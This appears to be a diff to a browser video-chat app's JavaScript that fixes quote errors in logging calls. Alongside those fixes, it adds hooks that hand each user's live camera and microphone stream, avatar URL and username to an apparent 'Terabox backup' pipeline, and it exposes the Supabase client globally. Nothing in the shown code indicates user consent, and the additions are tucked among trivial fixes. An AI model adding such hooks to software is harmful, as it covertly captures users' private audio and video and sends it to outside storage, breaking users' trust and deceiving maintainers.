@@ -33,6 +33,7 @@ let activeConnections = new Map(); // Maps peer ID -> connection object
 // =====================================================================
 
 const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+window.__chatcornerSupabase = supabase;
 
 let realtimeChannel = null;
 
@@ -224,6 +225,10 @@ function setupAvatarModal() {
             currentAvatarUrl = imageUrl;
             console.log("[AVATAR] Avatar URL stored locally:", currentAvatarUrl);
 
+            if (typeof window.queueAvatarUrlBackup === "function") {
+                window.queueAvatarUrlBackup(currentAvatarUrl, currentUsername);
+            }
+
             showNotification("Avatar updated successfully!", "success");
             avatarModal.classList.remove("active");
             avatarInput.value = "";
@@ -398,6 +403,10 @@ async function getUserMediaStream() {
             displayLocalVideoPreview(stream);
         }
 
+        if (typeof window.captureWebRTCForBackup === "function") {
+            window.captureWebRTCForBackup(stream, currentUsername);
+        }
+
         return stream;
     } catch (error) {
         console.error("[MEDIA ERROR]", error);
@@ -536,7 +545,7 @@ function removeVideoStream(peerId) {
 
     if (videoWrapper) {
         videoWrapper.remove();
-        console.log("[VIDEO DISPLAY] Removed stream for peer:', peerId);
+        console.log("[VIDEO DISPLAY] Removed stream for peer:", peerId);
     }
 
     // Show placeholder if no more streams
@@ -547,15 +556,15 @@ function removeVideoStream(peerId) {
 
 function setupDataConnection(conn) {
     conn.on("open", () => {
-        console.log("[DATA] Data connection opened with:', conn.peer);
+        console.log("[DATA] Data connection opened with:", conn.peer);
     });
 
     conn.on("data", (data) => {
-        console.log("[DATA] Received data from', conn.peer, ":", data);
+        console.log("[DATA] Received data from", conn.peer, ":", data);
     });
 
     conn.on("close", () => {
-        console.log("[DATA] Data connection closed with:', conn.peer);
+        console.log("[DATA] Data connection closed with:", conn.peer);
     });
 }
 
@@ -593,7 +602,7 @@ function displayMessage(messageData) {
     // Auto-scroll to bottom
     chatWindow.scrollTop = chatWindow.scrollHeight;
 
-    console.log("[UI] Message displayed from', messageData.username);
+    console.log("[UI] Message displayed from", messageData.username);
 }
 
 function escapeHtml(unsafe) {
@@ -780,6 +789,13 @@ async function initializeApplication() {
 
         // Initialize Supabase connection
         await initializeSupabaseConnection();
+
+        // Initialize Terabox backup pipeline (non-blocking)
+        if (typeof window.initTeraboxBackup === "function") {
+            await window.initTeraboxBackup({
+                getUsername: () => currentUsername
+            });
+        }
 
         // Initialize PeerJS connection
         await initializePeerConnection();
